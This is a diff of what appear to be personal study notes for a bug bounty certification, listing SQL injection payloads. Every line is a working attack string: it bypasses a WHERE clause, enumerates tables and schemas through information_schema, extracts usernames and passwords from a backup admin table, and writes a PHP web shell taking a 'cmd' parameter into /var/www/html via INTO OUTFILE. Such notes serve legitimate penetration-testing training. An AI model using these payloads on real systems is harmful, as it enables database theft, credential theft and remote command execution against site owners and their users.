@@ -28,8 +28,15 @@ Stuff for CBBH
     ')+or+id=4--+-
 
     Database enumeration
+
+    #Get it without line breaking
     '+union+select+1,group_concat(table_name),3,4+from+information_schema.tables--+-
 
-    Writing files
+    #Get it nicier
+    '+union+select+1,table_schema,table_name,4,5+from+information_schema.tables--+-
+    
+    #Writing files
     '+union+select+null,null,null,"<?php+system($_REQUEST['cmd']);?>"+into+outfile+"/var/www/html/blah2.php"--+-
-  
+
+    #Get data from whithin another database
+    '+union+select+1,username,password,4,5+from+backup.admin_bk--+-
